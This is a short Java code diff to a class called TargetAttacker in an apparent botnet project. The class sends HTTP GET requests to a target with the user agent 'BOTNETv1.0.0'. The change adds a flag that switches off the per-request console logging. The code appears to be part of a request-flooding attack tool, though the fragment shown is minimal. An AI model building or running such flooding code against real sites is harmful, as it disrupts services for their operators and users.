@@ -28,6 +28,7 @@ package com.giammp.botnet.control;
 
 import com.giammp.botnet.model.Target;
 import com.giammp.botnet.tools.RandomTools;
+import lombok.AllArgsConstructor;
 import lombok.Data;
 
 import java.io.IOException;
@@ -44,6 +45,7 @@ import java.util.Random;
 @Data
 public class TargetAttacker implements Runnable {
   private final Target target;
+  private final boolean output;
   private Random rnd = new Random();
 
   @Override
@@ -72,7 +74,9 @@ public class TargetAttacker implements Runnable {
     http.setRequestMethod("GET");
     http.setRequestProperty("User-Agent", "BOTNETv1.0.0");
     int response = http.getResponseCode();
-    System.out.format("[BOT]> GET %s :: %d\n", url, response);
+    if (this.isOutput()) {
+      System.out.format("[BOT]> GET %s :: %d\n", url, response);
+    }
   }
 
 }
